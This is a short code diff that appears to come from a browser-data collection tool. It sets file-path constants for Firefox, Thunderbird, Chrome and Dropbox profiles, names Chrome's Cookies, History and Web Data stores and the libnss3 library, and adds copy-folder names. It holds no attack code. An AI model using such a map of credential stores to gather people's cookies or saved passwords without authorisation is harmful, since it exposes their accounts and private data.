@@ -21,6 +21,8 @@ LIBNSS_LINUX = "libnss3.so"
 TH_PROFILE_WIN = WIN_APPDATA + "Roaming\\Thunderbird"
 TH_PROFILE_LINUX = LINUX_HOME + ".thunderbird"
 LIBNSS = LIBNSS_LINUX if OP_SYS == "Linux" else LIBNSS_WIN
+FF_COPY_FOLDER = "firefox-copy"
+TH_COPY_FOLDER = "thunderbird-copy"
 
 # chrome useful file
 GCHROME_PROFILE_WIN = WIN_APPDATA + "Local\\Google\\Chrome\\User Data"
@@ -30,9 +32,8 @@ BOOKMARKS = "Bookmarks"
 GCHROME_COOKIES = "Cookies"
 HISTORY = "History"
 WEB_DATA = "Web Data"
-CHROME_EXEC_WIN = "chrome.exe" 
-CHROME_EXEC_LINUX = "google-chrome-stable"
-#CHROME_EXE = subprocess.check_output(["cd \ & dir /s /b ", CHROME_EXEC_WIN]) if OP_SYS == "Windows" else subprocess.check_output(["which",CHROME_EXEC_LINUX])
+GCHROME_EXEC_LINUX = "google-chrome-stable"
+GCHROME_COPY_FOLDER = "chrome-copy"
 
 # Cloud 
 DROPBOX_WIN = WIN_APPDATA + "Roaming\\Dropbox"
